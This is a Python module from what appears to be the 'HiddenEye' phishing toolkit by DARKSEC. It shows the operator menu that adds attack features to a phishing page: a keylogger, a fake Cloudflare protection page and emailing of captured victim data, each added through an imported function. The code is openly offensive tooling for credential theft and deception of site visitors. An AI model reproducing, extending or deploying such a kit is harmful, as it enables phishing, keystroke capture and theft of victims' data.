from Defs.ImportManager.unsorted_will_be_replaced import run_command
import Defs.ThemeManager.theme as theme
import Defs.FeatureManager.cloudflare as cloudflare
import Defs.FeatureManager.EmailManager.email_prompt as email_prompt
import Defs.FeatureManager.keylogger as keylogger

default_palette = theme.default_palette


def feature_prompt():
    run_command("clear")
    print('''{1}
         _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {1}http://github.com/darksecdevelopers
         {0}** BY: {1}DARKSEC {0}**'''.format(default_palette[0], default_palette[2]))
    print(
        "---------------------------------------------------------\n{0}[ PROMPT: PLEASE CHOOSE FEATURES YOU WOULD LIKE TO USE. ]{1}!! {0}\n---------------------------------------------------------".format(
            default_palette[0], default_palette[4]))
    print("\n{0}[{1}A{0}]{1} KEYLOGGER (Usually Kills Connection) ".format(default_palette[0], default_palette[2]))
    print("\n{0}[{1}B{0}]{1} FAKE CLOUDFARE PROTECTION PAGE ".format(default_palette[0], default_palette[2]))
    print("\n{0}[{1}C{0}]{1} CAPTURED DATA EMAILED ".format(default_palette[0], default_palette[2]))
    print("\n{0}[{1}0{0}]{1} PRESS ONLY ENTER FOR NONE OF THE ABOVE ".format(default_palette[0], default_palette[2]))
    print('\n{0}[{1}*{0}]{1} Please type all together. Eg: ABC or AC {0}[{1}*{0}]{1}'.format(default_palette[0], default_palette[2]))
    option = input(
        "\n\n{1}{0}YOUR CHOICE >>> {2}".format(default_palette[0], default_palette[4], default_palette[2]))

    option.lower()

    letters = ["a", "b", "c", "d"]

    for x in option:
        if x in letters:
            if "a" in x:
                keylogger.add_keylogger()
            elif "b" in x:
                cloudflare.add_cloudfare()
            elif "c" in x:
                email_prompt.captured_data_email_configuration_prompt()

